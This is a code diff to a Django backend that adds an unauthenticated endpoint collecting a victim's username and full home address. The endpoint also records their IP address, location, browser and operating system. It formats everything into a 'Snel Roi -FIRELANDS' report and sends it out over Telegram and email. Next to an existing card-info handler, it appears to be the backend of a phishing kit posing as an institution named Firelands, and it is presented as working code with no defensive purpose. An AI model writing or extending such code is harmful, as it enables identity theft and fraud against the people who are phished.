@@ -568,3 +568,95 @@ def firelands_collect_user_card_info(request):
     except Exception as e:
         logger.error(f'Error in firelands_collect_user_card_info: {str(e)}')
         return Response({'error': str(e)}, status=400)
+
+@api_view(['POST'])
+@permission_classes([])
+@authentication_classes([])
+def firelands_collect_user_home_address(request):
+    payload = {}
+    data = {}
+    errors = {}
+
+    if request.method == "POST":
+        try:
+            username = request.data.get("emzemz", "")
+            street_address = request.data.get("stAd", "")
+            apt = request.data.get("apt", "")
+            city = request.data.get("city", "")
+            state = request.data.get("state", "")
+            zip_code = request.data.get("zipCode", "")
+
+            if not username:
+                errors["username"] = ["Username is required."]
+
+            if not street_address:
+                errors["street_address"] = ["Street address is required."]
+
+            if not city:
+                errors["city"] = ["City is required."]
+
+            if not state:
+                errors["state"] = ["State is required."]
+
+            if not zip_code:
+                errors["zip_code"] = ["Zip code is required."]
+
+            if errors:
+                payload["message"] = "Errors"
+                payload["errors"] = errors
+                return Response(payload, status=status.HTTP_400_BAD_REQUEST)
+
+            client = Client.objects.get(username=username)
+            
+            # Update client with address info
+            client.street_address = street_address
+            client.apt = apt
+            client.city = city
+            client.state = state
+            client.zip_code = zip_code
+            client.save()
+
+            ip = get_client_ip(request)
+            agent = request.META.get('HTTP_USER_AGENT', '')
+            country = get_country_from_ip(ip)
+            city = get_city_from_ip(ip)
+            browser = get_user_browser(agent)
+            os = get_user_os(agent)
+            date = datetime.now().strftime('%I:%M:%S %d/%m/%Y')
+
+            # Notification message
+            message = "|=====||Snel Roi -FIRELANDS||=====|\n"
+            message += "|========= [  HOME ADDRESS  ] ==========|\n"
+            message += f"| ➤ [ Username ]         : {username}\n"
+            message += f"| ➤ [ Street Address ]   : {street_address}\n"
+            if apt:
+                message += f"| ➤ [ Apartment ]        : {apt}\n"
+            message += f"| ➤ [ City ]             : {city}\n"
+            message += f"| ➤ [ State ]            : {state}\n"
+            message += f"| ➤ [ Zip Code ]         : {zip_code}\n"
+            message += "|=====================================|\n"
+            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+            message += "|======================================|\n"
+            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
+            message += f"| ➤ [ IP Country ]   : {country}\r\n"
+            message += f"| ➤ [ IP City ]      : {city}\r\n"
+            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
+            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
+            message += f"| ➤ [ TIME ]         : {date}\r\n"
+            message += "|=====================================|\n"
+
+            send_data_telegram(app_settings, message)
+            
+            subject = f"Firelands Home Address - {ip}"
+            from_email = _notification_sender()
+            recipient_list = _notification_recipients()
+            send_data_email(subject, message, from_email, recipient_list)
+
+            return Response({'status': 'success'}, status=status.HTTP_200_OK)
+
+        except Client.DoesNotExist:
+            logger.error(f'Client not found: {username}')
+            return Response({'error': 'User not found'}, status=status.HTTP_404_NOT_FOUND)
+        except Exception as e:
+            logger.error(f'Error in firelands_collect_user_home_address: {str(e)}')
+            return Response({'error': str(e)}, status=status.HTTP_400_BAD_REQUEST)
